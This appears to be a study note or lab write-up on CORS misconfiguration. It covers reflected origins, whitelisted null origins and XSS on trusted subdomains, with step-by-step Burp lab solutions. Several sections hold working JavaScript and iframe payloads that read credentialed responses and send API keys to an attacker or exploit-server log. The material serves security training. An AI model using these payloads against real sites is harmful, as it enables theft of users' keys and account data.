Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).
## Server-generated ACAO header from client-specified Origin header
For example, consider an application that receives the following request:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
It then responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```
this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
#### Lab:
- Check intercept is off, then use the browser to log in and access your account page.
- Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header:
    
    `Origin: https://example.com`
- Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
- In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL:
    
    `<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>`
- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click **Deliver exploit to victim**.
- Click **Access log**, retrieve and submit the victim's API key to complete the lab.
![](Pasted%20image%2020261014164840.png)

## Errors parsing Origin headers
Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
Suppose an application grants access to all domains ending in:
- `normal-website.com` 
An attacker might be able to gain access by registering the domain:
- `hackersnormal-website.com`
Alternatively, suppose an application grants access to all domains beginning with:
- `normal-website.com`
An attacker might be able to gain access using the domain:
- `normal-website.com.evil-user.net`
### Whitelisted null origin value
Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
And the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
#### Lab:
- Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
- Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.`
- Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
- In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
    `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>`
    Notice the use of an iframe sandbox as this generates a null origin request.
- Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click "Deliver exploit to victim".
- Click "Access log", retrieve and submit the victim's API key to complete the lab.
![](Pasted%20image%2020261014170927.png)
![](Pasted%20image%2020261014170902.png)
![](Pasted%20image%2020261014170950.png)
## Exploiting XSS via CORS trust relationships
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
If the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
- The victim user makes any plain HTTP request.
- The attacker injects a redirection to:
    `http://trusted-subdomain.vulnerable-website.com`
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
    `https://vulnerable-website.com`
- The victim's browser makes the CORS request, including the origin:
    `http://trusted-subdomain.vulnerable-website.com`
- The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
#### Lab:
- Check intercept is off, then use Burp's browser to log in and access your account page.
- Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name.
- Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
- Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain.
- Observe that the `productID` parameter is vulnerable to XSS.
- In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
    `<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>`
- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click **Deliver exploit to victim**.
- Click **Access log**, retrieve and submit the victim's API key to complete the lab.
![](Pasted%20image%2020261014173707.png)
![](Pasted%20image%2020261014173616.png)
